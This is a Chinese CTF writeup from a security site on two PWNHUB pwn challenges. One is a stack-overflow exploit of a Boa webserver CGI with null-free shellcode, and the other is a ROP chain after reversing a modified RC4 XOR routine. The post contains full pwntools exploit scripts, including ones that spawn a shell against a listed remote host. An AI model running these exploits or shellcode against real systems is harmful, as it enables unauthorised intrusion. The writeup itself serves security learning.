# PWNHUB 七月内部赛 babyboa、美好的异或 Writeup

阅读量 **228910**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-15 10:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

这次的 PWNHUB 内部赛的两道题目都不是常规题，babyboa 考察的是 Boa Webserver 的 cgi
文件的利用，美好的异或考察的则是通过逆向分析解密函数来构造栈溢出 ROP。两道题目的考点都非常新颖，其中第一道题更是结合了 Web，值得大家复现学习。

## babyboa

这道题的外表就是一个 Web 页面

![](https://p5.ssl.qhimg.com/t01a93657bc310ce374.png)

但是实际上他的主要内容都在 cgi 文件中

![](https://p2.ssl.qhimg.com/t019ac60df48709c588.png)

cgi 文件是使用静态编译的，这在线下比赛的题目中是非常常见的，所以学会如何还原静态库的符号信息非常重要，所以这里我们第一步先尝试着还原静态库的符号信息。

###  1.还原静态库的符号信息

还原静态库的信息一般用的是 IDA 提供的 FLIRT，这是一种函数识别技术，即库文件快速识别与鉴定技术（Fast Library
Identification and Recognition Technology）。可以通过 sig 文件来让 IDA
在无符号的二进制文件中识别函数特征，并且恢复函数名称等信息，大大增加了代码的可读性，加快分析速度。

而标准库的 sig 文件也有现成制作好的，在 <https://github.com/push0ebp/sig-database> 中下载，并且把文件导入到
IDA/sig/pc 中就能够使用，我这里为了快速找到我们导入的 sig 文件，将该文件夹中原有的文件都放到了 bak
目录下，把我们猜测可能会用到的符号文件放置到目录下

![](https://p5.ssl.qhimg.com/t01f7a019736d568b63.png)

导入后再在 IDA 中按 Shift + F5，打开“List of applied library modules”页面

![](https://p2.ssl.qhimg.com/t0181b0ca0a1364bb27.png)

然后再按 INS 并选择要自动分析特征还原的静态库文件

![](https://p5.ssl.qhimg.com/t0111af9a0ac1ff14e2.png)

我这里测试多次后选择的是 Ubuntu 16.04
libc6（2.23-0ubuntu6/amd64），如果你不知道静态编译使用的是哪个版本的库文件，可以尝试多导入几个版本的文件进行测试。

导入之后可以看到识别到了 623 个函数，并且大部分函数都有了名称

![](https://p5.ssl.qhimg.com/t01777dad5f17b3282d.png)

###  2.逻辑分析

在 Web 页面中输入密码可以抓到如下的包

![](https://p4.ssl.qhimg.com/t0168eb8060e43bcef5.png)

也就是实际上 Web 页面就是用来向后端的 cgi 传递参数，并且在 cgi 中判断密码信息

![](https://p0.ssl.qhimg.com/t01344e4b6515705346.png)

main 函数中分别判定了 REQUEST_METHOD 和 QUERY_STRING
是否正确，这两个参数分别代表的是访问的模式和传递的参数，在上面例子中应该是 GET 和 password=wjh。

通过初步的判断之后，就把参数的 127 字节复制到 bss 段上的一块内容上，并且通过 handle 函数来处理参数信息。

![](https://p1.ssl.qhimg.com/t01d25bc303b12a3629.png)

在这个函数中先把栈上的数据清 0，再把参数从第 9 位开始复制到栈上，从九位开始的原因是为了从 password=wjh 中取出 wjh
这个字符串用于判断，因为这个才是 Web 中真正输入的密码信息。

在栈上储存参数信息的只有 0x80 个字节，但是在前面获取参数的时候对长度没有限制，所以我们只要在参数中避免\x00 ，就可以造成栈溢出来进行后续的利用。

但是没有\x00 想要构造出 ROP 实在是不能够想象（因为地址中肯定会有\x00 数据），所以我这个时候对程序进行了 checksec

![](https://p3.ssl.qhimg.com/t016cd66655b2482c3c.png)

发现在程序中的保护是全关的，并且在进入 handle 函数之前有复制我们传入的参数到 bss 段上，这意味着我们只需要把返回地址修改为 bss
段上的参数，并且把这一段参数构成为没有\x00 的 shellcode，就可以执行 shellcode 控制程序流程。

###  3.漏洞利用

有了上述的思想之后，我们只需要考虑的就是如何构造 shellcode，以及如何调试等这些细节上的问题。

####  如何调试程序

由于程序就是 amd64 架构的程序，所以我们实际上能够直接的执行这个文件，但是由于我们没有传入参数的两个环境变量，所以我们也无法成功进入 handle
函数流程。

我这里使用的方法是直接 nop 掉 GET 参数的那部分判断，然后 patch getenv(“QUERY_STRING”)为 read
函数，具体的汇编代码如下。

![](https://p1.ssl.qhimg.com/t01e18c625b70062502.png)

程序中的 .eh_frame 这段空间是有执行权限的，如果直接 patch
程序的字节不够实现我们想要的功能，那么我们只需要直接在这段空间上写汇编代码，并且使想要 patch 的地方 call
这个地址即可，并且在修改之后返回到原来的位置。

而且 getenv 函数是以 rax 作为返回的值，内容是一个指向返回数据的指针，所以我们自己写的这个函数也需要实现这样的一个功能，我随便在 bss
段上找了一段空间，并且用 sys_read 读取内容，经过这样的修改我就可以成功的调试。

####  如何编写 shellcode

这里的 shellcode 比起之前所遇到的一些 shellcode 编写的题目要简单的多，关键点就在于这里的 shellcode 只需要没有\x00
即可，因为有了\x00 就会截断 Web 数据包的后续内容，导致 BOA Web 服务器无法正常的解析。

接下来只需要正常的编写 shellcode 即可，一般可能会遇到\x00 的地方就是引用一个内存地址，由于地址常常是 0x400000
这样的，最高的两个字节是\x00。我这里用的方法是异或 0x01010101 来避免地址最高两位的\x00。

orw 部分的 shellcode 直接用 pwntools 生成即可，使用以下命令就可以自动的生成出代码

    
    
    pwnlib.shellcraft.amd64.linux.cat("/flag")
    

除了用 cat 的方法，也可以考虑使用反弹 shell 的方法，这样的话也就不用考虑到 502 报错的问题，因为不需要 flag 的回显内容。

####  为何 502 了

回答这个问题的答案，就有些接近现实生活中的 PWN 的意味了，这也就是为了我需要专门写 Writeup
来说明这道题目。这个问题是让我纠结很久的一个问题，直到我下载了 BOA 的源码查看，我找到了它报错 502 的位置。

![](https://p5.ssl.qhimg.com/t012d49a92a2128c8a9.png)

这一段是 BOA 的源码，我发现当他判断 cgi 文件中没有\n\r\n 或者\n\n 这样的字符串的时候，就会报错 502。

而正常来说 cgi 文件中一定是会返回这样的字符串的，所以会运行正常。但是在 cgi 文件发生异常退出的时候，并没有把缓冲区中的数据进行输出，常规的 pwn
题都会在题目中使用 setbuf 来设置缓冲区的长度为 0，使得程序可以实时输出。而如果程序有缓冲区的话，直到缓冲区满了或者执行_IO_fflush
才会把数据内容全部输出。

在常规的程序中，虽然没有显式的去调用_IO_flush，但是默认会使用 _libc_start_main 来启动函数，而 exit
在_libc_start_main 中被自动调用，并且在 exit
又有去调用函数来检查每个缓冲区中是否有内容，如果存在内容则输出内容，所以这使得缓冲区的内容一定被输出。

![](https://p1.ssl.qhimg.com/t010ae7d8b048f408b2.png)

综上所述，我们需要在 shellcode 之后再加入一段代码使其调用 exit 来正常的退出程序，使得缓冲区被输出。

###  4.EXP

    
    
    from pwn import *
    
    context.log_level = "debug"
    context.arch = "amd64"
    
    
    def test(payload):
        sh = remote('47.99.38.177', 20001)
        data = '''GET /cgi-bin/Auth.cgi?{0} HTTP/1.1
        Host: 47.99.38.177:20001
        Connection: keep-alive
        DNT: 1
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: zh-CN,zh;q=0.9
    
    
        '''.format(payload)
        sh.send(data)
        sh.interactive()
    
    
    DEBUG = False
    exit_addr = 0x400e26
    shellcode_addr = 0x6D26C0
    shellcode = '''
    mov eax, 0x01410f27;
    xor eax, 0x01010101;
    jmp rax;
    '''
    shellcode = pwnlib.shellcraft.amd64.linux.cat("/flag") + shellcode
    shellcode = asm(shellcode).ljust(0x50, '\x90')
    payload = shellcode + 'a' * (0x91 - len(shellcode)) + '\xC0\x26\x6D'
    if DEBUG:
        sh = process('./Auth.cgi')
        gdb.attach(sh, "b *0x0000000000400AD5")
        sh.sendafter("charset:utf-8", payload)
        sh.interactive()
    else:
        test(payload)
    

执行脚本之后 flag 存在于所有数据之前，这是因为直接通过 orw shellcode 输出的 flag 数据不需要经过缓冲区，而其他数据在执行 exit
过程中才从缓冲区中输出，这正印证了我们之前的想法。

![](https://p0.ssl.qhimg.com/t01c5e1f74a98be9537.png)

## 美好的异或

这道题目其实考察的是 逆向算法 + 简单的栈溢出

![](https://p0.ssl.qhimg.com/t01b0c045b86c9f9e3f.png)

###  识别加密函数

可以先看看几个函数分别干了什么

![](https://p5.ssl.qhimg.com/t0167419189b79e0f08.png)

![](https://p5.ssl.qhimg.com/t013b80b11b28b9f643.png)

![](https://p2.ssl.qhimg.com/t01c358b82fbc61e499.png)

![](https://p5.ssl.qhimg.com/t011b50cd0d68c4d95b.png)

其实看到这几个函数，就可以大概猜到程序的加密是使用的魔改的 RC4 加密（把 RC4 加密中的 0x100 改为了 0x200）。

识别 RC4 加密的关键实际上就在于它的初始化秘钥代码，也就是循环对 s[i]进行赋值，赋值的内容就是为
i，另一个特征就是他的交换过程中的计算出的下标(s[i] + k[i] + v1) % 0x100，只需要看到类似的交换代码，就可以直接确定是 RC4
加密。

但由于 RC4
加密的本质操作就是通过得到异或数据进行异或，所以我们实际上只需要动态调试得到异或的数据并记录即可，在加解密的时候不需要考虑是什么加密，只需要对操作的内容进行异或。

###  解密数据和校验位

![](https://p4.ssl.qhimg.com/t017461253d88acc996.png)

下面这一段就是对内容进行异或运算，encode 函数经过混淆代码非常的复杂，但是我们实际上通过前面的函数就可以猜测到这个函数的功能，也就是将数据进行异或。

因为异或的数据是固定的，所以实际上这里传入的数据如果全都是\x00，就可以直接得到异或的秘钥，我觉得这里的实现是存在一定的问题的，这使得对代码的分析实际并不必要，只需要提取出异或的内容即可。

我这里编写程序来提取出异或的数据

    
    
    #include <cstdio>
    #include <cstring>
    
    unsigned int sz[10];
    
    void rc4_init(unsigned int* s, unsigned char* key, unsigned long Len)
    {
        int i = 0, j = 0;
        unsigned char k[0x200] = { 0 };
        unsigned int tmp = 0;
        for (i = 0; i < 0x200; i++)
        {
            s[i] = i;
            k[i] = key[i % Len];
        }
        for (i = 0; i < 0x200; i++)
        {
            j = (j + s[i] + k[i]) % 0x200;
            tmp = s[i];
            s[i] = s[j];
            s[j] = tmp;
        }
    }
    
    void rc4_crypt(unsigned int* s, unsigned int* Data, unsigned long Len)
    {
        int i = 0, j = 0, t = 0;
        unsigned long k = 0;
        unsigned int tmp;
        for (k = 0; k < Len; k++)
        {
            i = (i + 1) % 0x200;
            j = (j + s[i]) % 0x200;
            tmp = s[i];
            s[i] = s[j];
            s[j] = tmp;
            t = (s[i] + s[j]) % 0x200;
            Data[k] ^= s[t];
        }
    }
    
    int main()
    {
        unsigned int s[0x200];
        unsigned char key[] = "freedomzrc4rc4jwandu123nduiandd9872ne91e8n3n27d91cnb9496cbaw7b6r9823ncr89193rmca879w6rnw45232fc465v2vt5v91m5vm0amy0789";
        int key_len = strlen((char *)key);
        for (int i = 0; key[i]; i++)
            key[i] = 6;
        rc4_init(s, key, key_len);
        rc4_crypt(s, sz, 10);
        for (int i = 0; i < 10; i++)
            printf("0x%02X, ", sz[i] % 0x100);
        return 0;
    }
    

异或之后的内容，前八位是数据位，后两位是校验位。我们只需要根据程序的逻辑正向的推出数据的校验位即可。

###  漏洞利用

异或之后赋值给栈上的数组，并且由于之前读入的数据长度是 0xE0，计算后发现实际上超出了栈空间的大小，从而产生了栈溢出。由于程序没有开 pie，所以这里就是
ret2csu + ret2libc 即可。直接在 bss 段上写/bin/sh\x00，pop rdi 赋值 rdi 后，然后再调用 system 就可以
getshell。

这里有个不清楚的问题就是如果我直接调用 plt 上的
system，本地可以直接打通，但是远程会报错。如果有师傅知道这个问题的原因麻烦指教一下，因此我这里最后是借助程序本身使用的 system 那段
gadget 来执行 system，发现可以正常执行。

    
    
    from pwn import *
    
    elf = None
    libc = None
    file_name = "./main"
    
    
    # context.timeout = 1
    
    
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    
    
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    
    
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    
    
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    
    
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    
    
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    
    
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count < 3:
            try_count += 1
            try:
                pwn(sh, elf, libc)
                break
            except KeyboardInterrupt:
                break
            except EOFError:
                if target is not None:
                    sh = target.get_sh()
                    target.sh = sh
                    if target.connect_fail:
                        return 'ERROR : Can not connect to target server!'
                else:
                    sh = get_sh()
        flag = get_flag(sh)
        return flag
    
    
    def encode(data):
        all_data = ""
        for i in range(len(data) // 8):
            xor_data = [0x67, 0x3A, 0xDB, 0x9F, 0x21, 0x84, 0xDD, 0x24, 0x7C, 0x15]
            d = [ord(data[i * 8 + j]) for j in range(8)]
            s = ((d[7] + (d[6] << 8) + d[5] + (d[4] << 8) + d[3] + (d[2] << 8) + d[1] + (d[0] << 8)) >> 31) >> 24
            c = ((s + d[7] + d[5] + d[3] + d[1]) & 0xff - s + 0x100) & 0xff
            d = data[i * 8: (i + 1) * 8] + p16(c)
            all_data += ''.join(chr(ord(d[i]) ^ xor_data[i]) for i in range(10))
        return all_data
    
    
    def pwn(sh, elf, libc):
        context.log_level = "debug"
        pop_rdi_addr = 0x42cd13
        buf_addr = 0x68F2C0
        sh_data = '/bin/sh\x00\x7C\x71' * (0x68 // 8)
        # sh_data = 'sh\x00\x00\x00\x00\x00\x00\x7C\x8C' * (0x68 // 8)
        payload = p64(pop_rdi_addr) + p64(buf_addr) + p64(0x40099B)
        payload = sh_data + encode(payload)
        # gdb.attach(sh, "b *0x0000000000400B9D")
        sh.sendafter('enter:', payload)
        sh.interactive()
    
    
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
    

## 总结

这次的 babyboa 这道题目是我最接近 **现实生活中的漏洞利用** 的一次，也尝试了像反弹 shell 这样的操作。毕竟 CTF 中的 pwn
题目和现实生活中的二进制漏洞相差甚远，通过这样慢慢的尝试和努力，希望可以让我从做题走向现实生活这个大靶场，挖掘出真正的漏洞。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/246657](/post/id/246657)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __5赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

